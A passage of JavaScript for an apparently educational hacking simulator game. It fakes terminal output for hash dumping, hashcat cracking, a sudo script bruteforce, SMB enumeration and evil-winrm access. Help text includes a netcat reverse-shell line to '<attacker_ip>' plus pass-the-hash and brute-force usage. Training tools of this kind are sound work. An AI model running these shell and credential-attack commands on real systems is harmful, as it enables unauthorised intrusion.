    print('tickets  users', 'success');
    print('');
    // Check what SQL they're running
    const sqlQuery = fullCmd.match(/SELECT.*FROM.*users/i) || fullCmd.match(/\.dump/i) || fullCmd.match(/\.schema/i);
    
    if (sqlQuery || args.some(a => a.includes('users') || a.includes('SELECT'))) {
      print('sqlite> SELECT * FROM users;', 'system');
      print('id|username|password', 'system');
      print('1|admin|$2a$10$rRy...', 'system');
      print('2|guest|$2a$10$xyz...', 'system');
      print('3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2', 'system');
      print('');
      print('[*] Found user credentials in database', 'info');
      print('[*] joshua has bcrypt hash (cost factor 12)', 'info');
      state.extractedHash = true;
      autosave();
      return;
    }

    // Default: show tables
    print('sqlite> .tables', 'system');
    print('tickets  users', 'system');
    print('');
    print('[*] Found tables: tickets, users', 'info');
    print('[*] Query users table: SELECT * FROM users;', 'system');
    return;
  }

  // === HASHCAT ===
  if (cmd === 'hashcat') {
    // Handle --help
    if (args.includes('--help') || args.includes('-h')) {
      print('', '');
      print('hashcat v6.2.6 - advanced password recovery', 'info');
      print('', '');
      print('Usage: hashcat [options]... hash|hashfile|hccapxfile [dictionary|mask|directory]...', 'system');
      print('', '');
      print('OPTIONS:', 'warning');
      print('', '');
      print('  -m, --hash-type <num>       Hash-type (see below)', 'success');
      print('  -a, --attack-mode <num>     Attack-mode (0=straight, 1=combo, 3=brute, 6/7=hybrid)', 'system');
      print('  -o, --outfile <file>        Output file for recovered hashes', 'system');
      print('  -r, --rules-file <file>     Rules file for mutations', 'system');
      print('  --username                  Enable ignoring of usernames', 'system');
      print('  -w, --workload-profile      Performance (1=low, 2=default, 3=high, 4=nightmare)', 'system');
      print('  --show                      Show cracked passwords', 'system');
      print('  --force                     Ignore warnings', 'system');
      print('', '');
      print('COMMON HASH TYPES:', 'warning');
      print('    0 | MD5', 'system');
      print('  100 | SHA1', 'system');
      print(' 1000 | NTLM', 'success');
      print(' 1800 | sha512crypt', 'system');
      print(' 3200 | bcrypt $2*$', 'success');
      print(' 5600 | NetNTLMv2', 'system');
      print('13100 | Kerberos 5 TGS-REP etype 23 (Kerberoast)', 'success');
      print('18200 | Kerberos 5 AS-REP etype 23 (AS-REP roast)', 'success');
      print('22000 | WPA-PBKDF2-PMKID+EAPOL', 'system');
      print('', '');
      print('EXAMPLES:', 'warning');
      print('  hashcat -m 0 hash.txt rockyou.txt            # MD5 dictionary', 'system');
      print('  hashcat -m 1000 hash.txt rockyou.txt         # NTLM dictionary', 'system');
      print('  hashcat -m 3200 hash.txt rockyou.txt         # bcrypt dictionary', 'system');
      print('  hashcat -m 13100 hash.txt rockyou.txt        # Kerberoast', 'system');
      print('  hashcat -m 1000 -a 3 hash.txt ?a?a?a?a?a?a   # NTLM brute-force 6 chars', 'system');
      print('', '');
      return;
    }

    if (!state.extractedHash) {
      print('No hash to crack. Extract one first!', 'warning');
      return;
    }

    // Validate required -m flag
    if (!args.includes('-m')) {
      print('hashcat: missing argument for hash-type', 'error');
      print('', '');
      print('Usage: hashcat -m <mode> <hash_file> <wordlist>', 'system');
      print('', '');
      print('Common modes:', 'info');
      print('    0  = MD5', 'system');
      print(' 1000  = NTLM', 'system');
      print(' 3200  = bcrypt', 'success');
      print('13100  = Kerberos TGS-REP (Kerberoast)', 'system');
      print('', '');
      print('Try: hashcat --help for full options', 'system');
      return;
    }

    // Get hash mode
    const mIdx = args.indexOf('-m');
    const mode = args[mIdx + 1];

    if (!mode || isNaN(parseInt(mode))) {
      print('hashcat: -m requires a numeric hash-type', 'error');
      print('', '');
      print('Example: hashcat -m 3200 hash.txt rockyou.txt', 'system');
      return;
    }

    // Validate mode 3200 for bcrypt
    if (mode !== '3200') {
      print(`hashcat: starting hash-mode ${mode}...`, 'system');
      await simulateLoading('Analyzing hash', 1500);
      print('', '');
      print('Hashfile \'hash.txt\': bcrypt hash detected', 'info');
      print(`Hash-mode ${mode} doesn't match the hash type`, 'error');
      print('', '');
      print('[!] The hash appears to be bcrypt ($2a$)', 'warning');
      print('[*] Use: hashcat -m 3200 hash.txt wordlist.txt', 'info');
      return;
    }

    // Check for wordlist/dictionary argument
    const hasWordlist = args.some(a => a.includes('.txt') || a.includes('rockyou') || a.includes('wordlist'));
    if (!hasWordlist) {
      print('hashcat: No dictionary/wordlist specified', 'error');
      print('', '');
      print('Usage: hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt', 'system');
      return;
    }

    await simulateLoading('Cracking bcrypt hash', 4000);
    print('', '');
    print('hashcat (v6.2.6) starting...', 'info');
    print('', '');
    print('OpenCL API (OpenCL 3.0) - Platform #1 [Intel(R) Corporation]', 'muted');
    print('=============================================================', 'muted');
    print('', '');
    print('Minimum password length supported by kernel: 0', 'system');
    print('Maximum password length supported by kernel: 72', 'system');
    print('', '');
    print('Hashes: 1 digests; 1 unique digests, 1 unique salts', 'system');
    print('Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates', 'muted');
    print('', '');
    print('$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1', 'success');
    print('', '');
    print('Session..........: hashcat', 'system');
    print('Status...........: Cracked', 'success');
    print('Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))', 'system');
    print('Hash.Target......: $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUE...', 'system');
    print('Time.Started.....: ' + new Date().toLocaleString(), 'system');
    print('Time.Estimated...: ' + new Date().toLocaleString(), 'system');
    print('Kernel.Feature...: Pure Kernel', 'muted');
    print('Guess.Base.......: File (rockyou.txt)', 'system');
    print('Speed.#1.........:      127 H/s (6.24ms) @ Accel:4 Loops:32 Thr:1 Vec:1', 'system');
    print('Recovered........: 1/1 (100.00%) Digests', 'success');
    print('Progress.........: 8192/14344385 (0.06%)', 'system');
    print('', '');
    print('[+] Password cracked: spongebob1', 'success');
    print('[*] Use this to su joshua', 'info');
    state.crackedPassword = true;
    autosave();
    return;
  }

  // === SU ===
  if (cmd === 'su') {
    const user = args[0] || 'root';

    if (user === 'joshua') {
      if (!state.crackedPassword) {
        print('Password: ', 'system');
        print('su: Authentication failure', 'error');
        return;
      }

      print('Password: ********', 'system');
      await sleep(500);
      print('[+] Switched to joshua', 'success');
      state.shellUser = 'joshua';
      state.currentDir = '/home/joshua';
      prompt.textContent = 'joshua@codify:~$';
      return;
    }

    if (user === 'root') {
      print('Password: ', 'system');
      print('su: Authentication failure', 'error');
      print('[*] Hint: Check sudo -l for joshua', 'info');
      return;
    }

    print('su: user ' + user + ' does not exist', 'error');
    return;
  }

  // === SUDO ===
  if (cmd === 'sudo') {
    if (state.shellUser !== 'joshua' && !state.crackedPassword) {
      print('[sudo] password for svc:', 'system');
      print('Sorry, user svc may not run sudo on codify.', 'error');
      return;
    }

    if (args[0] === '-l') {
      print('Matching Defaults entries for joshua on codify:', 'system');
      print('    env_reset, mail_badpass', 'system');
      print('');
      print('User joshua may run the following commands on codify:', 'info');
      print('    (root) /opt/mysql-backup.sh', 'success');
      print('');
      print('[!] Can run backup script as root!', 'warning');
      print('[*] Analyze the script: cat /opt/mysql-backup.sh', 'info');
      return;
    }

    if (args.join(' ').includes('mysql-backup')) {
      if (!state.analyzedScript) {
        print('[*] Running /opt/mysql-backup.sh as root...', 'info');
        print('Enter MySQL password for root: ', 'system');
        print('Password incorrect!', 'error');
        print('');
        print('[*] Analyze the script first: cat /opt/mysql-backup.sh', 'info');
        return;
      }

      // Realistic bash pattern matching bruteforce
      // The script uses [[ $USER_PASS == $DB_PASS ]] which does pattern matching
      // Real password: kljh12k3jhaskjh12kjh3
      // We need to bruteforce character by character using glob patterns

      // Check if they're using stdin (realistic bruteforce method)
      const usingStdin = fullCmd.includes('echo') || fullCmd.includes('|') || fullCmd.includes('stdin');
      
      if (usingStdin || args.some(a => a.match(/^[a-z0-9*]+$/))) {
        // They're attempting pattern matching bruteforce
        const pattern = args.find(a => a.match(/^[a-z0-9*]+$/)) || '';
        
        if (!pattern) {
          print('Enter MySQL password for root: ', 'system');
          print('Password incorrect!', 'error');
          print('');
          print('[*] Use pattern matching: echo "k*" | sudo /opt/mysql-backup.sh', 'info');
          print('[*] Or: echo "kl*" | sudo /opt/mysql-backup.sh', 'info');
          print('[*] Continue until full password is found', 'system');
          return;
        }

        // Realistic pattern matching check
        const realPassword = 'kljh12k3jhaskjh12kjh3';
        const patternMatches = pattern.endsWith('*') && realPassword.startsWith(pattern.slice(0, -1));

        if (patternMatches || pattern === realPassword) {
          if (pattern === realPassword) {
            // Full password provided
            print('Enter MySQL password for root: ********', 'system');
            print('Backup completed successfully!', 'success');
            print('');
            print('[+] GOT ROOT ACCESS!', 'success');
            state.gotRoot = true;
            state.shellUser = 'root';
            state.currentDir = '/root';
            prompt.textContent = 'root@codify:~#';
            playSuccess();
            autosave();
            return;
          } else {
            // Partial match - encourage continuing
            print('Enter MySQL password for root: ' + pattern.replace(/\*/g, '').replace(/./g, '*'), 'system');
            print('Backup completed successfully!', 'success');
            print('');
            print(`[+] Pattern "${pattern}" matches! Continue bruteforcing...`, 'warning');
            print(`[*] Try: echo "${pattern.slice(0, -1)}k*" | sudo /opt/mysql-backup.sh`, 'info');
            print('[*] Or: echo "' + pattern.slice(0, -1) + 'l*" | sudo /opt/mysql-backup.sh', 'info');
            state.bruteforceProgress = pattern.length - 1;
            return;
          }
        } else {
          print('Enter MySQL password for root: ' + pattern.replace(/\*/g, '').replace(/./g, '*'), 'system');
          print('Password incorrect!', 'error');
          print('');
          print(`[*] Pattern "${pattern}" does not match. Try different characters.`, 'warning');
          return;
        }
      }

      // Direct password attempt
      const inputPw = args.find(a => !a.startsWith('-') && !a.includes('mysql-backup')) || '';
      
      if (inputPw === 'kljh12k3jhaskjh12kjh3') {
        print('Enter MySQL password for root: ********', 'system');
        print('Backup completed successfully!', 'success');
        print('');
        print('[+] GOT ROOT ACCESS!', 'success');
        state.gotRoot = true;
        state.shellUser = 'root';
        state.currentDir = '/root';
        prompt.textContent = 'root@codify:~#';
        playSuccess();
        autosave();
        return;
      }

      // Wrong password
      print('Enter MySQL password for root: ********', 'system');
      print('Password incorrect!', 'error');
      print('');
      print('[*] Use bash pattern matching to bruteforce:', 'info');
      print('[*] Example: echo "k*" | sudo /opt/mysql-backup.sh', 'system');
      print('[*] If it succeeds, try: echo "kl*" | sudo /opt/mysql-backup.sh', 'system');
      print('[*] Continue character by character until full password', 'info');
      return;
    }

    print('sudo: command not found', 'error');
    return;
  }

  // === LINPEAS ===
  if (cmd === 'linpeas') {
    // Handle --help
    if (args.includes('--help') || args.includes('-h')) {
      print('', '');
      print('LinPEAS - Linux Privilege Escalation Awesome Script', 'info');
      print('', '');
      print('Usage: ./linpeas.sh [OPTIONS]', 'system');
      print('', '');
      print('OPTIONS:', 'warning');
      print('  -a             All checks (longer)', 'system');
      print('  -s             Superfast (no colors, no banners)', 'system');
      print('  -e             Extra enumeration', 'system');
      print('  -P             Password supplied for sudo checks', 'system');
      print('  -o <dir>       Output directory', 'system');
      print('  -N             Do not use network for checks', 'system');
      print('', '');
      print('ENUMERATION CHECKS:', 'info');
      print('  • System Information        • Interesting Files', 'system');
      print('  • Container Detection       • Writable Locations', 'system');
      print('  • User Information          • SUID/SGID Binaries', 'system');
      print('  • Sudo/SUID/Capabilities    • Cron Jobs', 'system');
      print('  • Network Information       • SSH Keys', 'system');
      print('  • Running Processes         • Database Files', 'system');
      print('', '');
      return;
    }

    await simulateLoading('Running LinPEAS', 3000);
    print('', '');
    print('╔══════════════════════════════════════════════════════════════╗', 'warning');
    print('║                      LinPEAS v3.1.9                          ║', 'warning');
    print('║       Linux Privilege Escalation Awesome Script              ║', 'warning');
    print('╠══════════════════════════════════════════════════════════════╣', 'warning');
    print('║ Created by PEASS-ng/PEASS Team                               ║', 'muted');
    print('╚══════════════════════════════════════════════════════════════╝', 'warning');
    print('', '');
    print('═══════════════════════════════════╣ Basic Information ╠═══════════════════════════════════', 'info');
    print('OS: Linux version 5.15.0-84-generic', 'system');
    print('User & Groups: uid=1001(svc) gid=1001(svc) groups=1001(svc)', 'system');
    print('Hostname: codify', 'system');
    print('', '');
    print('═══════════════════════════════════╣ Interesting Files ╠═══════════════════════════════════', 'info');
    print('╔══════════╣ Database files', 'warning');
    print('    /var/www/contact/tickets/tickets.db', 'success');
    print('', '');
    print('═══════════════════════════════════╣ Software Information ╠════════════════════════════════', 'info');
    print('╔══════════╣ Sudo version', 'warning');
    print('Sudo version 1.9.9', 'system');
    print('', '');
    print('═══════════════════════════════════╣ Users Information ╠═══════════════════════════════════', 'info');
    print('╔══════════╣ Checking sudo permissions', 'warning');
    if (state.shellUser === 'joshua') {
      print('    User joshua may run:', 'system');
      print('    (root) /opt/mysql-backup.sh', 'success');
    } else {
      print('    User svc may not run sudo on codify.', 'system');
    }
    print('', '');
    print('═══════════════════════════════════╣ Interesting Files ╠═══════════════════════════════════', 'info');
    print('╔══════════╣ Scripts in /opt', 'warning');
    print('    -rwxr-xr-x 1 root root 928 Sep 12 17:40 /opt/mysql-backup.sh', 'success');
    print('', '');
    print('[!] Found potential privesc vector: /opt/mysql-backup.sh', 'warning');
    print('[*] Analyze with: cat /opt/mysql-backup.sh', 'info');
    print('', '');
    return;
  }

  // === NC (netcat) ===
  if (cmd === 'nc' || cmd === 'netcat' || cmd === 'ncat') {
    // Handle --help
    if (args.includes('--help') || args.includes('-h')) {
      print('', '');
      print('nc (netcat) - TCP/IP swiss army knife', 'info');
      print('', '');
      print('Usage: nc [options] [hostname] [port]', 'system');
      print('', '');
      print('OPTIONS:', 'warning');
      print('  -l              Listen mode, for inbound connects', 'success');
      print('  -v              Verbose', 'system');
      print('  -n              Numeric-only IP addresses, no DNS', 'system');
      print('  -p <port>       Local port number', 'system');
      print('  -e <prog>       Execute program after connect (dangerous!)', 'system');
      print('  -c <shell>      Shell commands to exec', 'system');
      print('  -u              UDP mode', 'system');
      print('  -w <secs>       Timeout for connects and final net reads', 'system');
      print('  -z              Zero-I/O mode [used for scanning]', 'system');
      print('', '');
      print('COMMON USAGE:', 'warning');
      print('  Listener (attacker):         nc -lvnp 4444', 'success');
      print('  Reverse shell (target):      nc <attacker_ip> 4444 -e /bin/bash', 'system');
      print('  Bind shell (target):         nc -lvnp 4444 -e /bin/bash', 'system');
      print('  File transfer (receive):     nc -lvnp 4444 > file', 'system');
      print('  File transfer (send):        nc <ip> 4444 < file', 'system');
      print('  Port scan:                   nc -zv <ip> 1-1000', 'system');
      print('', '');
      return;
    }

    // Validate listener flags
    const hasListen = args.includes('-l') || args.includes('-lvnp') || args.includes('-nlvp') || args.includes('-lnvp');

    if (!hasListen && !args.some(a => a.match(/^\d+\.\d+\.\d+\.\d+$/))) {
      print('nc: missing required flags or destination', 'error');
      print('', '');
      print('For listener: nc -lvnp <port>', 'system');
      print('For connect:  nc <host> <port>', 'system');
      print('', '');
      print('Try: nc --help for full options', 'system');
      return;
    }

    if (hasListen) {
      // Find port number
      let port = null;
      for (let i = 0; i < args.length; i++) {
        if (args[i] === '-p' && args[i+1]) {
          port = args[i+1];
          break;
        }
        if (args[i].match(/^\d+$/) && parseInt(args[i]) > 0 && parseInt(args[i]) < 65536) {
          port = args[i];
          break;
        }
        if (args[i] === '-lvnp' || args[i] === '-nlvp' || args[i] === '-lnvp') {
          if (args[i+1] && args[i+1].match(/^\d+$/)) {
            port = args[i+1];
            break;
          }
        }
      }

      if (!port) {
        print('nc: missing port number', 'error');
        print('Usage: nc -lvnp <port>', 'system');
        return;
      }

      print(`Listening on 0.0.0.0 ${port}`, 'info');
      print('[*] Waiting for incoming connection...', 'system');
      print('[*] Use payload command to trigger reverse shell', 'muted');
      return;
    }

    print('Connection refused', 'error');
    return;
  }

  // === Unknown command ===
  if (state.gotShell) {
    print(cmd + ': command not found', 'error');
  } else {
    print('Command not found: ' + cmd, 'error');
    print('Type "help" for available commands', 'system');
  }
}

// ============================================
// LEVEL 2: HACKER
// ============================================
async function initLevel2() {
  gameState.levelState = {
    scanned: false,
    foundShares: false,
    gotHash: false,
    crackedHash: false,
    authenticated: false
  };

  print('┌─────────────────────────────────────────┐', 'info');
  print('│  TARGET INTEL                           │', 'info');
  print('├─────────────────────────────────────────┤', 'info');
  print('│  Network:  10.10.10.0/24                │', 'system');
  print('│  Your IP:  10.10.14.5 (VPN)             │', 'system');
  print('│  OS:       Windows Server / Win10       │', 'system');
  print('│  Domain:   CORP.LOCAL                   │', 'system');
  print('│  Intel:    SMB shares, weak passwords   │', 'warning');
  print('├─────────────────────────────────────────┤', 'info');
  print('│  KNOWN HOSTS:                           │', 'info');
  print('│    10.10.10.1   - Router                │', 'system');
  print('│    10.10.10.50  - FILE-SRV01            │', 'system');
  print('│    10.10.10.100 - CORP-DC01 (DC)        │', 'warning');
  print('└─────────────────────────────────────────┘', 'info');
  print('');
  print('[BRIEFING] You\'re inside the network now.', 'info');
  print('[BRIEFING] Multiple hosts detected. Find creds. Move laterally.', 'info');
  print('[BRIEFING] Target: Domain user account on CORP-DC01', 'info');
  print('');
}

async function handleLevel2Command(cmd, args) {
  const state = gameState.levelState;

  if (cmd === 'help') {
    print('', '');
    print('╔════════════════════════════════════════════════════════════════╗', 'info');
    print('║                    LEVEL 2 COMMANDS                            ║', 'info');
    print('╠════════════════════════════════════════════════════════════════╣', 'info');
    print('║  RECONNAISSANCE:                                               ║', 'info');
    print('║    nmap <network>         Scan network for hosts              ║', 'system');
    print('║    crackmapexec smb <ip>  Enumerate SMB shares on target      ║', 'system');
    print('║                                                                ║', 'info');
    print('║  SMB ACCESS:                                                   ║', 'info');
    print('║    smbclient //<ip>/<share>   Connect to SMB share           ║', 'system');
    print('║    get <filename>         Download file from SMB share        ║', 'system');
    print('║                                                                ║', 'info');
    print('║  CREDENTIAL CRACKING:                                          ║', 'info');
    print('║    hashcat -m 1000 <hash>  Crack NTLM hash (mode 1000)        ║', 'system');
    print('║                                                                ║', 'info');
    print('║  LATERAL MOVEMENT:                                             ║', 'info');
    print('║    evil-winrm -i <ip> -u <user> -p <pass>  WinRM shell        ║', 'system');
    print('║                                                                ║', 'info');
    print('║  POST-EXPLOITATION:                                            ║', 'info');
    print('║    whoami                 Show current user (confirms access) ║', 'system');
    print('║    ls / cat <file>        Browse filesystem                   ║', 'system');
    print('║                                                                ║', 'info');
    print('║  UTILITY:                                                      ║', 'info');
    print('║    status                 Show current progress               ║', 'success');
    print('║    hint                   Get a hint if stuck                 ║', 'warning');
    print('║    exit                   Return to main menu                 ║', 'system');
    print('╚════════════════════════════════════════════════════════════════╝', 'info');
    print('', '');
    print('TIP: Use TAB for autocomplete, ↑/↓ for command history', 'system');
    return;
  }

  if (cmd === 'status') {
    print('', '');
    print('┌─────────────────────────────────────┐', 'info');
    print('│      LEVEL 2 PROGRESS STATUS        │', 'info');
    print('├─────────────────────────────────────┤', 'info');
    print(`│  [${state.scanned ? 'x' : ' '}] Network scanned              │`, state.scanned ? 'success' : 'system');
    print(`│  [${state.foundShares ? 'x' : ' '}] SMB shares discovered        │`, state.foundShares ? 'success' : 'system');
    print(`│  [${state.gotHash ? 'x' : ' '}] Password hash obtained        │`, state.gotHash ? 'success' : 'system');
    print(`│  [${state.crackedHash ? 'x' : ' '}] Hash cracked                  │`, state.crackedHash ? 'success' : 'system');
    print(`│  [${state.authenticated ? 'x' : ' '}] Domain user compromised      │`, state.authenticated ? 'success' : 'system');
    print('└─────────────────────────────────────┘', 'info');
    print('', '');
    return;
  }

  if (cmd === 'hint') {
    print('', '');
    print('[*] HINT:', 'warning');
    if (!state.scanned) {
      print('Start by scanning the network to discover hosts.', 'info');
      print('Try: nmap 10.10.10.0/24', 'success');
    } else if (!state.foundShares) {
      print('Check for SMB shares on the file server (10.10.10.50).', 'info');
      print('Try: crackmapexec smb 10.10.10.50', 'success');
    } else if (!state.gotHash) {
      print('Access the IT_Backup share - IT admins often leave sensitive files there.', 'info');
      print('Try: smbclient //10.10.10.50/IT_Backup', 'success');
    } else if (!state.crackedHash) {
      print('You have an NTLM hash! Crack it with hashcat mode 1000.', 'info');
      print('Try: hashcat -m 1000 hash.txt', 'success');
    } else if (!state.authenticated) {
      print('Use the cracked credentials to get a shell on the domain controller.', 'info');
      print('Try: evil-winrm -i 10.10.10.100 -u svc_backup -p Backup2023!', 'success');
    } else {
      print('Verify your access with whoami to complete the level!', 'info');
      print('Try: whoami', 'success');
    }
    print('', '');
    return;
  }

  // Easter egg: mimikatz
  if (cmd === 'mimikatz') {
    print('mimikatz # sekurlsa::logonpasswords', 'system');
    print('', 'system');
    print('[ERROR] Access Denied - Need SYSTEM privileges', 'error');
    print('', 'system');
    print('Nice try! But not in this level...', 'warning');
    addEasterEgg('lvl2_mimikatz', 'Patience, young padawan. Mimikatz comes later.');
    return;
  }

  if (cmd === 'nmap') {
    // Handle --help
    if (args.includes('--help') || args.includes('-h')) {
      print('', '');
      print('Nmap 7.94 ( https://nmap.org )', 'info');
      print('Usage: nmap [Scan Type(s)] [Options] {target specification}', 'system');
      print('', '');
      print('TARGET SPECIFICATION:', 'info');
      print('  Can pass hostnames, IP addresses, networks (CIDR), etc.', 'system');
      print('  Ex: 10.10.10.0/24, scanme.nmap.org, 192.168.0.1', 'system');
      print('', '');
      print('SCAN TECHNIQUES:', 'info');
      print('  -sS: TCP SYN scan (stealth)', 'system');
      print('  -sT: TCP Connect scan', 'system');
      print('  -sU: UDP scan', 'system');
      print('  -sn: Ping scan (host discovery only)', 'system');
      print('', '');
      print('SERVICE/VERSION DETECTION:', 'info');
      print('  -sV: Probe ports for service/version info', 'success');
      print('  -sC: Equivalent to --script=default', 'success');
      print('', '');
      print('EXAMPLES:', 'warning');
      print('  nmap 10.10.10.0/24           # Discover hosts on network', 'system');
      print('  nmap -sV -sC 10.10.10.50     # Service scan specific host', 'system');
      print('', '');
      return;
    }

    // Must provide target
    if (!args[0]) {
      print('Nmap: No target specified.', 'error');
      print('Usage: nmap [options] <target>', 'system');
      print('Example: nmap 10.10.10.0/24', 'info');
      return;
    }

    // Check for network or specific hosts
    const target = args.find(a => a.match(/^[\d.\/]+$/) || a.includes('10.10.10'));
    if (!target || (!target.includes('10.10.10') && !target.includes('/24'))) {
      print(`Starting Nmap 7.94...`, 'system');
      await simulateLoading('Scanning ' + (target || 'target'), 1500);
      print('Note: Host seems down.', 'warning');
      return;
    }

    await simulateLoading('Scanning network ' + target, 3000);
    print('');
    print(`Starting Nmap 7.94 ( https://nmap.org ) at ${new Date().toLocaleString()}`, 'system');
    print('Nmap scan report for ' + target, 'info');
    print('');
    print('Discovered hosts:', 'info');
    print('  10.10.10.1   - Router', 'system');
    print('  10.10.10.10  - WORKSTATION-01 (Windows 10)', 'system');
    print('  10.10.10.50  - FILE-SRV01 (Windows Server 2019) [445/tcp open]', 'success');
    print('  10.10.10.100 - CORP-DC01 (Domain Controller) [88,389,445/tcp open]', 'warning');
    print('');
    print('Nmap done: 256 IP addresses (4 hosts up) scanned', 'muted');
    print('');
    print('[*] SMB (445) open on FILE-SRV01 - enumerate shares!', 'info');
    state.scanned = true;
    autosave();
    return;
  }

  if (cmd === 'crackmapexec' || cmd === 'cme' || cmd === 'netexec' || cmd === 'nxc') {
    // Handle --help
    if (args.includes('--help') || args.includes('-h')) {
      print('', '');
      print('CrackMapExec v5.4.0 (NetExec successor)', 'info');
      print('', '');
      print('Usage: crackmapexec <protocol> <target> [options]', 'system');
      print('', '');
      print('PROTOCOLS:', 'warning');
      print('  smb       SMB protocol', 'success');
      print('  ldap      LDAP protocol', 'system');
      print('  winrm     WinRM protocol', 'system');
      print('  mssql     MSSQL protocol', 'system');
      print('  ssh       SSH protocol', 'system');
      print('', '');
      print('SMB OPTIONS:', 'info');
      print('  --shares              Enumerate shares', 'success');
      print('  --users               Enumerate domain users', 'system');
      print('  --groups              Enumerate domain groups', 'system');
      print('  --pass-pol            Enumerate password policy', 'system');
      print('  -u USER -p PASS       Authenticate with credentials', 'system');
      print('  -H HASH               Pass-the-hash (NTLM)', 'system');
      print('  --local-auth          Local authentication', 'system');
      print('', '');
      print('EXAMPLES:', 'warning');
      print('  crackmapexec smb 10.10.10.50 --shares', 'system');
      print('  crackmapexec smb 10.10.10.0/24 -u user -p pass', 'system');
      print('  crackmapexec smb 10.10.10.50 -u user -H <ntlm_hash>', 'system');
      print('', '');
      return;
    }

    if (!state.scanned) {
      print('Scan the network first to discover hosts', 'warning');
      return;
    }

    // Must specify protocol
    if (!args[0] || !['smb', 'ldap', 'winrm', 'mssql', 'ssh'].includes(args[0])) {
      print('Error: No protocol specified', 'error');
      print('', '');
      print('Usage: crackmapexec <protocol> <target> [options]', 'system');
      print('Protocols: smb, ldap, winrm, mssql, ssh', 'system');
      print('', '');
      print('Example: crackmapexec smb 10.10.10.50 --shares', 'info');
      return;
    }

    // Must specify target
    if (!args[1]) {
      print('Error: No target specified', 'error');
      print('Usage: crackmapexec smb <target> [options]', 'system');
      return;
    }

    if (args.includes('10.10.10.50') || args.includes('FILE-SRV01')) {
      await simulateLoading('Enumerating SMB', 2000);
      print('');
      print('SMB         10.10.10.50     445    FILE-SRV01       [*] Windows Server 2019 Build 17763 x64', 'system');
      print('SMB         10.10.10.50     445    FILE-SRV01       [+] CORP\\ - Guest session', 'info');
      print('SMB         10.10.10.50     445    FILE-SRV01       [+] Enumerated shares:', 'success');
      print('SMB         10.10.10.50     445    FILE-SRV01       Share           Permissions     Remark', 'system');
      print('SMB         10.10.10.50     445    FILE-SRV01       -----           -----------     ------', 'muted');
      print('SMB         10.10.10.50     445    FILE-SRV01       IT_Backup       READ            ', 'success');
      print('SMB         10.10.10.50     445    FILE-SRV01       Users           READ            ', 'system');
      print('SMB         10.10.10.50     445    FILE-SRV01       ADMIN$                          Remote Admin', 'error');
      print('SMB         10.10.10.50     445    FILE-SRV01       C$                              Default share', 'error');
      print('SMB         10.10.10.50     445    FILE-SRV01       IPC$            READ            Remote IPC', 'system');
      print('');
      print('[!] IT_Backup share is readable - connect with smbclient!', 'warning');
      state.foundShares = true;
      autosave();
      return;
    }

    if (args.includes('10.10.10.100') || args.includes('CORP-DC01')) {
      await simulateLoading('Connecting to DC', 1500);
      print('');
      print('SMB         10.10.10.100    445    CORP-DC01        [*] Windows Server 2019 Build 17763 x64', 'system');
      print('SMB         10.10.10.100    445    CORP-DC01        [-] CORP\\ - Access Denied', 'error');
      print('');
      print('[!] Access denied - need valid credentials', 'warning');
      return;
    }

    print('Connection failed: Host unreachable or access denied', 'error');
    return;
  }

  if (cmd === 'smbclient') {
    // Handle --help
    if (args.includes('--help') || args.includes('-h')) {
      print('', '');
      print('smbclient - ftp-like client to access SMB/CIFS shares', 'info');
      print('', '');
      print('Usage: smbclient //server/share [options]', 'system');
      print('', '');
      print('OPTIONS:', 'warning');
      print('  -U, --user=USERNAME   Set the network username', 'system');
      print('  -W, --workgroup=WG    Set the workgroup/domain name', 'system');
      print('  -N, --no-pass         Null authentication (no password)', 'system');
      print('  -L, --list=HOST       List shares on host', 'system');
      print('  -c, --command=CMD     Execute command(s)', 'system');
      print('', '');
      print('SMB COMMANDS (once connected):', 'info');
      print('  ls                    List files', 'system');
      print('  get <file>            Download file', 'success');
      print('  put <file>            Upload file', 'system');
      print('  cd <dir>              Change directory', 'system');
      print('  pwd                   Print current directory', 'system');
      print('  exit / quit           Exit smbclient', 'system');
      print('', '');
      print('EXAMPLES:', 'warning');
      print('  smbclient //10.10.10.50/IT_Backup -N', 'system');
      print('  smbclient //10.10.10.50/share -U "DOMAIN\\user"', 'system');
      print('  smbclient -L 10.10.10.50 -N', 'system');
      print('', '');
      return;
    }

    if (!state.foundShares) {
      print('Error: Find shares first with crackmapexec', 'warning');
      print('Try: crackmapexec smb 10.10.10.50 --shares', 'info');
      return;
    }

    // Must provide share path
    if (!args[0]) {
      print('smbclient: Missing share path', 'error');
      print('Usage: smbclient //server/share [options]', 'system');
      print('Example: smbclient //10.10.10.50/IT_Backup -N', 'info');
      return;
    }

    // Validate share path format
    if (!args[0].startsWith('//')) {
      print('smbclient: Invalid share path format', 'error');
      print('Share path must start with //server/share', 'system');
      print('Example: smbclient //10.10.10.50/IT_Backup', 'info');
      return;
    }

    if (args[0].includes('IT_Backup')) {
      print('', '');
      print('Try "help" to get a list of possible commands.', 'muted');
      print('smb: \\> ls', 'system');
      print('  .                                   D        0  Mon Jan 15 09:00:00 2024', 'system');
      print('  ..                                  D        0  Mon Jan 15 09:00:00 2024', 'system');
      print('  old_passwords.txt                   A      156  Mon Jan 15 08:45:00 2024', 'success');
      print('  config.bak                          A     1024  Mon Jan 15 08:30:00 2024', 'system');
      print('', '');
      print('                8153023 blocks of size 4096. 3142523 blocks available', 'muted');
      print('', '');
      print('[!] Interesting file found: old_passwords.txt', 'warning');
      print('[*] Use: get old_passwords.txt', 'info');
      state.inSmbShare = true;
      return;
    }

    if (args[0].includes('ADMIN$') || args[0].includes('C$')) {
      print('session setup failed: NT_STATUS_ACCESS_DENIED', 'error');
      return;
    }

    print('tree connect failed: NT_STATUS_BAD_NETWORK_NAME', 'error');
    return;
  }

  // Separate get command for SMB download
  if (cmd === 'get') {
    if (!state.foundShares) {
      print('Not connected to any share', 'error');
      return;
    }

    if (args[0] === 'old_passwords.txt' || (args[0] && args[0].includes('password'))) {
      await simulateLoading('Downloading old_passwords.txt', 1500);
      print('', '');
      print('╔════════════════════════════════════════════════════════════╗', 'info');
      print('║             FILE: old_passwords.txt                        ║', 'info');
      print('╠════════════════════════════════════════════════════════════╣', 'info');
      print('║  # Old password hashes - to be deleted                     ║', 'warning');
